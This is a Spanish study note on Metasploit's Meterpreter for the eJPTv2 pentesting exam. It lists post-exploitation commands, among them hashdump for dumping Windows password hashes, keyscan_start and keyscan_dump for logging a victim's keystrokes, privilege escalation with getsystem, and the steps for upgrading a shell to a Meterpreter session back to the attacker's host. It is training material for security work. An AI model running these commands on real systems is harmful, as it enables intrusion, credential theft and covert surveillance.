**Meterpreter** es un payload de Metasploit que proporciona un control interactivo y dinámico sobre el sistema comprometido. A diferencia de una shell convencional (`cmd` o `/bin/bash`), Meterpreter permite ejecutar comandos complejos sin necesidad de crear nuevos procesos en el disco de la víctima.
## 🛠️ Comandos Esenciales (Top 10)
Una vez que obtienes la sesión, estos son los comandos que debes ejecutar casi por instinto:
### 1. Reconocimiento de Sistema

- **`sysinfo`**: Muestra información del sistema operativo, arquitectura (x86/x64) y nombre del host.
- **`getuid`**: Te dice quién eres (ej. `NT AUTHORITY\SYSTEM`, `Administrator` o un usuario raso).
- **`getprivs`**: Enumera los privilegios que tiene tu proceso actual (busca `SeDebugPrivilege` o `SeImpersonatePrivilege`).

### 2. Gestión de Archivos y Sistema

- **`upload / local / path`**: Sube un archivo desde tu Kali a la víctima.
- **`download / remote / path`**: Descarga un archivo de la víctima a tu Kali.
- **`ps`**: Lista todos los procesos en ejecución (útil para encontrar antivirus o procesos de otros usuarios).
- **`migrate <PID>`**: Mueve tu sesión a otro proceso (ej. migrar a `explorer.exe` para mayor estabilidad).

### 3. Elevación y Credenciales

- **`getsystem`**: Intenta elevar privilegios automáticamente a **SYSTEM** mediante varias técnicas.
- **`hashdump`**: Vuelca la base de datos SAM (Windows) para obtener hashes de contraseñas.
- **`shell`**: Te da una shell normal del sistema operativo (`cmd.exe` o `/bin/sh`). Para volver a Meterpreter, escribe `exit`.

Para mas comandos, puedes usar `help` para listarlos y ver su descripción
## 🚀 De Shell Normal a Meterpreter
A veces, un exploit te devolverá una shell básica (limitada). Mejorala a Meterpreter para tener acceso a todas las herramientas de post-explotación.
### Paso a paso:

1. **Pon la shell en segundo plano:** Si estás dentro de la shell básica, presiona `Ctrl + Z` y confirma con `y`. La sesión quedará como (por ejemplo) `Session 1`.
2. **Selecciona el módulo de mejora:**
	- `use post/multi/manage/shell_to_meterpreter`
3. Configura los parámetros y ejecuta:
	- `set SESSION <ID>`
	- `set LHOST <TU_IP_KALI>`
	- `set LPORT <PUERTO>`
	- `run o exploit`

**Resultado:** Metasploit enviará un nuevo payload a través de la shell básica y te abrirá una **Session 2** que será de tipo Meterpreter.

## ⌨️ Keylogging con Meterpreter

El keylogging permite capturar todas las pulsaciones de teclado de la víctima en tiempo real. Es extremadamente útil para obtener contraseñas, correos electrónicos o mensajes mientras el usuario los escribe.
### 🛠️ Comandos Esenciales
Una vez dentro de una sesión de **Meterpreter**, utiliza los siguientes comandos en orden:

1. **`keyscan_start`** Inicia el proceso de captura en segundo plano. A partir de este momento, todo lo que escriba la víctima se guardará en un búfer oculto.
2. **`keyscan_dump`** Vuelca en tu pantalla todas las teclas capturadas hasta el momento. Puedes ejecutarlo varias veces para ir viendo el progreso sin detener el escaneo.
3. **`keyscan_stop`** Detiene el proceso de captura y limpia el búfer.
## 💡 Tips para el eJPTv2

- **Arquitectura:** Si el sistema es de 64 bits (`sysinfo`), intenta que tu sesión de Meterpreter también lo sea (`x64`). Esto evita errores al ejecutar módulos de escalada.
- **Ayuda:** Si olvidas un comando, escribe `help` dentro de la sesión para ver todos los comandos clasificados por categorías (archivo, red, sistema, etc.).
- **Persistencia:** Meterpreter es volátil. Si la máquina se reinicia, pierdes la sesión. Asegúrate de haber recolectado toda la información necesaria (especialmente con `hashdump` y `creds`) en cuanto entres.

#
---
**Navegación:**
- Volver a: [[Metasploit]]